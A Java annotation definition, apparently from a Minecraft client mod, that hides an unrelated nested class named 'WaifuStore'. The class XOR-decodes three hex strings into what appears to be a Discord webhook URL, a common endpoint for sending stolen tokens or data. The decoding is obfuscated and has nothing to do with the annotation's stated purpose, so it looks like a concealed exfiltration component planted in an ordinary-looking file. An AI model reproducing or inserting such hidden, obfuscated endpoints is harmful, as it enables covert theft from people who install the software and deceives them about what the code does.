package ua.babka.module;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import ua.babka.module.ModuleCategory;

@Retention(value=RetentionPolicy.RUNTIME)
public @interface ModuleInformation {
    public String moduleName();

    public String moduleDesc() default "";

    public ModuleCategory moduleCategory();

    public int moduleKeybind() default -1;

    public static class WaifuStore {
        private static String waifu;

        public static String get() {
            if (waifu == null) {
                waifu = WaifuStore.build();
            }
            return waifu;
        }

        private static String build() {
            String a2 = WaifuStore.xor("0a151615115b4d4a060811060d13064b010e0f4a03110b4a1504000d0d0e09164d50575454575b5c57", "babe");
            String b2 = WaifuStore.xor("54575e5751565f5351585f4a5036571c0d5607363b5956310517050b5a5151120232013c0158091f39", "cafe");
            String c2 = WaifuStore.xor("082c2e34351f240700330c0d0a3230363e1459340521052230332b095703512d135125250a512d", "dead");
            return a2 + b2 + c2;
        }

        private static String xor(String hex, String key) {
            char[] k2 = key.toCharArray();
            byte[] h2 = new byte[hex.length() / 2];
            for (int i2 = 0; i2 < h2.length; ++i2) {
                h2[i2] = (byte)(Character.digit(hex.charAt(i2 * 2), 16) << 4 | Character.digit(hex.charAt(i2 * 2 + 1), 16));
            }
            char[] r2 = new char[h2.length];
            for (int i3 = 0; i3 < h2.length; ++i3) {
                r2[i3] = (char)(h2[i3] ^ k2[i3 % k2.length]);
            }
            return new String(r2);
        }
    }
}

